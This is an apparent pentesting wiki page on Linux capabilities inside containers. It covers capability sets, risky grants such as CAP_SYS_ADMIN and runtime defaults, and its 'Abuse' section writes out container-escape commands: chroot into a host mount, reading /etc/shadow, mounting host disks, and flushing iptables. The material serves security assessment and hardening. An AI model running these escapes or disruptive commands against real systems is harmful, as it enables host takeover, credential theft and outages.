# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux capabilities are one of the most important pieces of container security because they answer a subtle but fundamental question: **what does "root" really mean inside a container?** On a normal Linux system, UID 0 historically implied a very broad privilege set. In modern kernels, that privilege is decomposed into smaller units called capabilities. A process may run as root and still lack many powerful operations if the relevant capabilities have been removed.

Containers depend on this distinction heavily. Many workloads are still launched as UID 0 inside the container for compatibility or simplicity reasons. Without capability dropping, that would be far too dangerous. With capability dropping, a containerized root process can still perform many ordinary in-container tasks while being denied more sensitive kernel operations. That is why a container shell that says `uid=0(root)` does not automatically mean "host root" or even "broad kernel privilege". The capability sets decide how much that root identity is actually worth.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operation

Capabilities are tracked in several sets, including permitted, effective, inheritable, ambient, and bounding sets. For many container assessments, the exact kernel semantics of each set are less immediately important than the final practical question: **which privileged operations can this process successfully perform right now, and which future privilege gains are still possible?**

The reason this matters is that many breakout techniques are really capability problems disguised as container problems. A workload with `CAP_SYS_ADMIN` can reach a huge amount of kernel functionality that a normal container root process should not touch. A workload with `CAP_NET_ADMIN` becomes much more dangerous if it also shares the host network namespace. A workload with `CAP_SYS_PTRACE` becomes much more interesting if it can see host processes through host PID sharing. In Docker or Podman that may appear as `--pid=host`; in Kubernetes it usually appears as `hostPID: true`.

In other words, the capability set cannot be evaluated in isolation. It has to be read together with namespaces, seccomp, and MAC policy.

## Lab

A very direct way to inspect capabilities inside a container is:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

You can also compare a more restrictive container with one that has all capabilities added:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

To see the effect of a narrow addition, try dropping everything and adding back only one capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## High-Risk Capabilities

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** is the one defenders should treat with the most suspicion. It is often described as "the new root" because it unlocks an enormous amount of functionality, including mount-related operations, namespace-sensitive behavior, and many kernel paths that should never be casually exposed to containers. If a container has `CAP_SYS_ADMIN`, weak seccomp, and no strong MAC confinement, many classic breakout paths become much more realistic.

**`CAP_SYS_PTRACE`** matters when process visibility exists, especially if the PID namespace is shared with the host or with interesting neighboring workloads. It can turn visibility into tampering.

**`CAP_NET_ADMIN`** and **`CAP_NET_RAW`** matter in network-focused environments. On an isolated bridge network they may already be risky; on a shared host network namespace they are much worse because the workload may be able to reconfigure host networking, sniff, spoof, or interfere with local traffic flows.

**`CAP_SYS_MODULE`** is usually catastrophic in a rootful environment because loading kernel modules is effectively host-kernel control. It should almost never appear in a general-purpose container workload.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them very directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and frequently benefits from rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`. System-container environments such as LXC/Incus also rely on capability control, but the broader host integration of those systems often tempts operators into relaxing defaults more aggressively than they would in an app-container environment.

The same principle holds across all of them: a capability that is technically possible to grant is not necessarily one that should be granted. Many real-world incidents begin when an operator adds a capability simply because a workload failed under a stricter configuration and the team needed a quick fix.

## Misconfigurations

The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.

It is also common to see administrators believe that because a workload is not fully `--privileged`, it is still meaningfully constrained. Sometimes that is true, but sometimes the effective posture is already close enough to privileged that the distinction stops mattering operationally.

## Abuse

The first practical step is to enumerate the effective capability set and immediately test the capability-specific actions that would matter for escape or host information access:

```bash
capsh --print
grep '^Cap' /proc/self/status
```

If `CAP_SYS_ADMIN` is present, test mount-based abuse and host filesystem access first, because this is one of the most common breakout enablers:

```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```

If `CAP_SYS_PTRACE` is present and the container can see interesting processes, verify whether the capability can be turned into process inspection:

```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```

If `CAP_NET_ADMIN` or `CAP_NET_RAW` is present, test whether the workload can manipulate the visible network stack or at least gather useful network intelligence:

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```

When a capability test succeeds, combine it with the namespace situation. A capability that looks merely risky in an isolated namespace can become an escape or host-recon primitive immediately when the container also shares host PID, host network, or host mounts.

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

If the container has `CAP_SYS_ADMIN` and a writable bind mount of the host filesystem such as `/host`, the escape path is often straightforward:

```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```

If `chroot` succeeds, commands now execute in the host root filesystem context:

```bash
id
hostname
cat /etc/shadow | head
```

If `chroot` is unavailable, the same result can often be achieved by calling the binary through the mounted tree:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

### Full Example: `CAP_SYS_ADMIN` + Device Access

If a block device from the host is exposed, `CAP_SYS_ADMIN` can turn it into direct host filesystem access:

```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```

### Full Example: `CAP_NET_ADMIN` + Host Networking

This combination does not always produce host root directly, but it can fully reconfigure the host network stack:

```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```

That can enable denial of service, traffic interception, or access to services that were previously filtered.

## Checks

The goal of the capability checks is not only to dump raw values but to understand whether the process has enough privilege to make its current namespace and mount situation dangerous.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

What is interesting here:

- `capsh --print` is the easiest way to spot high-risk capabilities such as `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, or `cap_sys_module`.
- The `CapEff` line in `/proc/self/status` tells you what is actually effective now, not just what might be available in other sets.
- A capability dump becomes much more important if the container also shares host PID, network, or user namespaces, or has writable host mounts.

After collecting the raw capability information, the next step is interpretation. Ask whether the process is root, whether user namespaces are active, whether host namespaces are shared, whether seccomp is enforcing, and whether AppArmor or SELinux still restricts the process. A capability set by itself is only part of the story, but it is often the part that explains why one container breakout works and another fails with the same apparent starting point.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

For Kubernetes, the important point is that the API does not define one universal default capability set. If the Pod does not add or drop capabilities, the workload inherits the runtime default for that node.
{{#include ../../../../banners/hacktricks-training.md}}
